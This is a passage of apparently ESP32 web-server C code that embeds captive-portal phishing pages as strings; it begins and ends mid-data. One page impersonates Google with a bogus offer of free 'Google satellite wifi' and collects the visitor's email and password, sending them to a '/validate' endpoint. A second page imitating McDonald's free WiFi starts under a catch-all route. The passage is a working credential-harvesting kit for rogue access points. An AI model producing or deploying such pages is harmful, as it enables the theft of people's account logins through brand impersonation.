iAnIkDa2kbZV5XsTRTPnff2jQbSAaxdYiyH4oheHCu1L3YNzWeQ1afct/gNBtQolxH5covMeSaeQX8NxFZ66ZqdcF9g9NsYHcFQPw3XX5hvxh026W5c0S/F0Pqdgr4DZPRnXLHYRjokYGQ+p2TertcaHbHNAHVHFIt6+0tKES4b+xoGFldO30NHm4jT17kVKQuKGFuzZ4zcsfRCW5rMDUHp5sr3eEOdzgf/wd5MUlMEIOkpwAAAABJRU5ErkJggg==');\n"
                    "            background-size: 116px 38px;\n"
                    "            background-repeat: no-repeat;\n"
                    "            float: none;\n"
                    "            margin: 40px auto 30px;\n"
                    "            display: block;\n"
                    "            height: 38px;\n"
                    "            width: 116px;\n"
                    "        }\n"
                    "\n"
                    "        .banner {\n"
                    "            text-align: center;\n"
                    "        }\n"
                    "\n"
                    "        .banner h1 {\n"
                    "            font-family: 'Roboto', sans-serif;\n"
                    "            -webkit-font-smoothing: antialiased;\n"
                    "            color: #555;\n"
                    "            font-size: 42px;\n"
                    "            font-weight: 300;\n"
                    "            margin-top: 0;\n"
                    "            margin-bottom: 20px;\n"
                    "        }\n"
                    "\n"
                    "        .banner h2 {\n"
                    "            font-family: 'Roboto', sans-serif;\n"
                    "            -webkit-font-smoothing: antialiased;\n"
                    "            color: #555;\n"
                    "            font-size: 18px;\n"
                    "            font-weight: 400;\n"
                    "            margin-bottom: 20px;\n"
                    "        }\n"
                    "\n"
                    "        .circle-mask {\n"
                    "            display: block;\n"
                    "            height: 96px;\n"
                    "            width: 96px;\n"
                    "            overflow: hidden;\n"
                    "            border-radius: 50%;\n"
                    "            margin-left: auto;\n"
                    "            margin-right: auto;\n"
                    "            z-index: 100;\n"
                    "            margin-bottom: 10px;\n"
                    "            background-size: 96px;\n"
                    "            background-repeat: no-repeat;\n"
                    "            background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMAAAADACAAAAAB3tzPbAAACOUlEQVR4Ae3aCQrrIBRG4e5/Tz+CBAlIkIAECUjoSt48z/GZeAvnrMCvc6/38XzxAAAAYC4AAAAAAAAAAAAAAAAAAAAAAAAAAAAMCAAAAAAAAAAAAAAAAPsagz4V4rq/FmCLTj/k4vYqgCN5/TKfjlcAJKff5pJ5QPH6Y77YBiz6a4thQJ30D03VKmB3+qfcbhOwO+l+waP/+VsEBgDV6USumgNMOtVkDbDoZIstQNHpiimA1+m8JUBSQ8kO4HBqyB1mAElNJTMAr6a8FcCmxjYjgKjGohGAU2POBmBXc7sJwKrmVhOAqOaiCUBQc8EEQO0JwPMB4ADASwhAe3yR8VPiP3/M8XOaPzQd/lLyp56xSuvnUGK0yHC313idCw6umNov+bhm5aK7fdWAZQ/WbdoXnlg5Y+mvfe2SxVdWj20FAAAAAAAAAAAAwFQAAJSS0hwmfVMIc0qlmAfsOQWvP+RDyrtNQM1L0D8WllxNAWqOXifzMVcbgG3xaswv22jAFp3a6zFteYw8fQ9DM6Amr275VG8GlFmdm8uNgDzpgqZ8EyB7XZTPNwDKpAubysWAOuvi5nolYHW6PLdeBjiCbikc1wCK0025cgUg68Zyf0DUrcXegKibi30Bq25v7QnYNKCtH+BwGpA7ugFmDWnuBSgaVOkECBpU6AOoGlbtAlg1rLULIGhYoQvAaViuC0AD6wE4Xh1QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADA194CuqC6onikxXwAAAAASUVORK5CYII=');\n"
                    "            -webkit-transition: opacity 0.075s;\n"
                    "            -moz-transition: opacity 0.075s;\n"
                    "            -ms-transition: opacity 0.075s;\n"
                    "            -o-transition: opacity 0.075s;\n"
                    "            transition: opacity 0.075s;\n"
                    "        }\n"
                    "        .login-form #g:hover {\n"
                    "            border: 1px solid #0953b3;\n"
                    "        }\n"
                    "        .login-form #l:hover {\n"
                    "            background-color: #3577e0;\n"
                    "        }\n"
                    "        .login-form #l:active{\n"
                    "            background-color: #326ac4;\n"
                    "        }\n"
                    "    </style>\n"
                    "</head>\n"
                    "\n"
                    "<body>\n"
                    "    <div class='logo' aria-label='Google'></div>\n"
                    "    <div class='banner'>\n"
                    "        <h1>\n"
                    "            Your location has been selected to test the new Google satellite wifi for free.\n"
                    "        </h1>\n"
                    "        <h2>\n"
                    "            Sign up with Google and start surfing for free now!\n"
                    "        </h2>\n"
                    "        <h2 class='hidden-small'>\n"
                    "            Sign in to your Google account to continue.\n"
                    "        </h2>\n"
                    "    </div>\n"
                    "    <div class='login-page'>\n"
                    "        <div class='form'>\n"
                    "            <form class='login-form' action='/validate' method='GET'>\n"
                    "                <div class='circle-mask'></div>\n"
                    "                <br>\n"
                    "                <input id='g' type='email' placeholder='Mail' name='user' required />\n"
                    "                <input id='g' type='password' placeholder='Enter your password' name='pass' required />\n"
                    "                <input type='hidden' name='url' value='google.com'>\n"
                    "                <button id='l' type='submit'>Login</button>\n"
                    "            </form>\n"
                    "        </div>\n"
                    "    </div>\n"
                    "</body>\n"
                    "\n"
                    "</html>"
};


httpd_uri_t captive_portal_uri_mcdonalds = {
        .uri = "/*",
        .method = HTTP_GET,
        .handler = common_get_handler,
        .user_ctx ="<html>\n"
                   "<head>\n"
                   "  <title>McDonald's Free WiFi</title>\n"
                   "  <style>\n"
                   "    body {\n"
                   "      font-family: Arial, sans-serif;\n"
                   "      margin: 0;\n"
                   "      padding: 0;\n"
                   "      background-color: #ae101f;\n"
                   "    }\n"
                   "    .container {\n"
                   "      max-width: 960px;\n"
                   "      margin: 0 auto;\n"
                   "      padding: 20px;\n"
                   "    }\n"
                   "    header {\n"
                   "      background-color: #000;\n"
                   "      color: #fff;\n"
                   "      display: flex;\n"
                   "      align-items: center;\n"
                   "      justify-content: space-between;\n"
                   "      padding: 20px;\n"
                   "    }\n"
                   "    header h1 {\n"
                   "      margin: 0;\n"
                   "      font-size: 32px;\n"
                   "    }\n"
                   "    header .logo {\n"
                   "      width: 100px;\n"
                   "      height: 100px;\n"
                   "      background-image: url('data:image/png;base64,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